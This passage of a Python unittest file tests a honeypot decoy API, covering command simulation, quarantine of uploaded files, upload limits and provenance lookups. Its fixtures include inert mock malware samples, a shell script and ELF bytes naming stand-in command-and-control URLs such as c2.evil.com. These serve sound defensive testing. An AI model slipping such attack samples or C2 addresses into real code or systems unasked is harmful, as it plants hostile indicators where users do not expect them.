        self.assertIn("tracked_sources", res_sum.json())

    def test_decoy_command_simulation_api(self) -> None:
        """POST /api/decoy/simulate/command runs commands through the sandbox API."""
        sim_data = {
            "session_id": "api-sess-01",
            "command": "uname -a",
            "source_ip": "127.0.0.1",
        }
        res = self.client.post("/api/decoy/simulate/command", json=sim_data)
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertIn("Linux", data["output"])
        self.assertEqual(data["event"]["session_id"], "api-sess-01")

    def test_api_upload_json_base64(self) -> None:
        """POST /api/decoy/upload accepts JSON base64 payloads and stores them in quarantine."""
        raw_payload = b"#!/bin/sh\n# Exploit script\nURL=http://c2.evil.com:8080/bot\n"
        b64_content = base64.b64encode(raw_payload).decode("ascii")
        expected_sha = hashlib.sha256(raw_payload).hexdigest()

        req_body = {
            "session_id": "api-upload-b64-sess",
            "filename": "exploit.sh",
            "content_base64": b64_content,
        }
        res = self.client.post("/api/decoy/upload", json=req_body)
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertEqual(data["status"], "quarantined")
        self.assertEqual(data["sha256"], expected_sha)
        self.assertEqual(data["original_filename"], "exploit.sh")
        self.assertIn("http://c2.evil.com:8080/bot", data["candidate_urls"])
        self.assertEqual(data["event"]["malware_hash"], expected_sha)
        self.assertEqual(data["event"]["c2_address"], "http://c2.evil.com:8080/bot")

    def test_api_upload_raw_binary(self) -> None:
        """POST /api/decoy/upload accepts raw binary streams with query parameters."""
        raw_bin = b"\x7fELF\x02\x01\x01\x00http://botnet.cc:9999/listen"
        expected_sha = hashlib.sha256(raw_bin).hexdigest()

        res = self.client.post(
            "/api/decoy/upload?session_id=api-upload-bin-sess&filename=malware.elf",
            content=raw_bin,
            headers={"Content-Type": "application/octet-stream"},
        )
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertEqual(data["status"], "quarantined")
        self.assertEqual(data["sha256"], expected_sha)
        self.assertEqual(data["original_filename"], "malware.elf")
        self.assertEqual(data["event"]["malware_hash"], expected_sha)

    def test_api_upload_oversized_returns_413(self) -> None:
        """POST /api/decoy/upload rejects payloads larger than 2MB with HTTP 413."""
        huge_bytes = b"0" * (decoy.MAX_UPLOAD_SIZE_BYTES + 512)
        res = self.client.post(
            "/api/decoy/upload?session_id=sess-too-big&filename=huge.bin",
            content=huge_bytes,
            headers={"Content-Type": "application/octet-stream"},
        )
        self.assertEqual(res.status_code, 413)
        self.assertIn("exceeds maximum limit", res.json()["detail"])

    def test_api_upload_malformed_returns_400(self) -> None:
        """POST /api/decoy/upload rejects empty or malformed base64 with HTTP 400."""
        # Empty body
        res1 = self.client.post(
            "/api/decoy/upload?session_id=sess-empty",
            content=b"",
            headers={"Content-Type": "application/octet-stream"},
        )
        self.assertEqual(res1.status_code, 400)

        # Invalid base64
        res2 = self.client.post(
            "/api/decoy/upload",
            json={"session_id": "sess-bad-b64", "filename": "bad.sh", "content_base64": "!!!not_valid_b64!!!"},
        )
        self.assertEqual(res2.status_code, 400)

    def test_api_get_provenance(self) -> None:
        """GET /api/decoy/provenance/{session_id} returns detailed local provenance or 404."""
        sid = "api-prov-test-sess"
        # Submit file evidence first
        test_file = b"http://ioc-hunter.net:443/alert\n"
        decoy.submit_file_evidence(sid, "beacon.sh", test_file)

        res_ok = self.client.get(f"/api/decoy/provenance/{sid}")
        self.assertEqual(res_ok.status_code, 200)
        data = res_ok.json()
        self.assertEqual(data["session_id"], sid)
        self.assertEqual(data["file_submissions_count"], 1)
        self.assertIn("epistemic_disclaimer", data)

        res_404 = self.client.get("/api/decoy/provenance/nonexistent-session-xyz")
        self.assertEqual(res_404.status_code, 404)


if __name__ == "__main__":
    unittest.main()

